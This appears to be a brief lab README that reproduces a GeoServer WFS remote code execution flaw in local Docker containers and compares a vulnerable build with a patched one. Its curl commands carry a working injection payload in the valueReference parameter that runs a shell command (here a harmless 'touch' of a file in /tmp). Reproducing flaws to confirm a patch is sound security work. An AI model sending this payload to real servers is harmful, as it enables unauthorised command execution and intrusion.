# Vulnerable version
```
docker compose -f docker-compose-vuln.yml up
curl "http://127.0.0.1:8080/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success1')"
docker exec -it geoserver-vulnerable-1 /bin/bash
ls /tmp/success1
```
# Patched version
do the same for a secured geoserver instance at 127.0.0.1
```
docker compose -f docker-compose-safe.yml up
curl "http://127.0.0.1:8080/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'touch%20/tmp/success2')"
docker exec -it geoserver-safe-1 /bin/bash
ls /tmp/success2
```
you can see there is no file with this path
